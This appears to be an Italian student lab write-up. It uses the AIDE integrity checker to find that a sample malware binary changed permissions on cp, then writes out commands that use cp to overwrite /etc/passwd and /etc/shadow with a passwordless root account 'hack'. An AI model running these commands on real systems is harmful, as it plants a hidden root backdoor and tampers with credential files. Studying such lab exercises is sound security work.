#FASE 1

La strategia ideale per identificare le modifiche fatte è utilizzare l'integrity checker AIDE

1. Modifico la configurazione di aide per eseguire il controllo su /usr/bin ed /etc
2. Inizializzo il database pulito con il comando: aide -c /home/kali/aide/aide.conf -i
3. Copio il database con: cp /home/kali/aide/aide.db{.new,}
4.Cambio i permessi al malware: chmod +x ./change3
4. Eseguo il malware: sudo ./change3
5. Eseguo il controllo cpn lo stato precedente con il comando: aide -c /home/kali/aide/aide.conf -C

Possiamo quindi notare che sono stati modificati i permessi per il comando cp

cp /etc/passwd ~/esame/passwd_leggibile 
cat ~/esame/passwd_leggibile >> ~/esame/passwd_modificabile 

echo "hack::0:0:System Administrator:/var/root:/bin/sh" >> ~/esame/passwd_modificabile

cp ~/esame/passwd_modificabile /etc/passwd


cp /etc/shadow ~/esame/shadow_leggibile 
cat ~/esame/shadow_leggibile >> ~/esame/shadow_modificabile 

echo "hack::19445:0:99999:7:::" >> ~/esame/shadow_modificabile 

cp ~/esame/shadow_modificabile /etc/shadow

su hack
id


Nel file /etc/shadow non vengono memorizzate le password, ma le loro impronte calcolate con funzione hash. 
Memorizzando la password dentro un file di testo "pass.txt", si può generare l'hash del file, e quindi della password calcolato con l'algoritmo sha512

esempio 

se la mia password è "ciaoooooooo"

il suo hash sarà

eab01dd8ebd1a23a0f53ef1ad7e51a32403de972bed6933cd65ec5ab9b5b48134296af267ab057e584bf438a8e1f08a8de723ad7a37eb025107669ea89b8f7ef
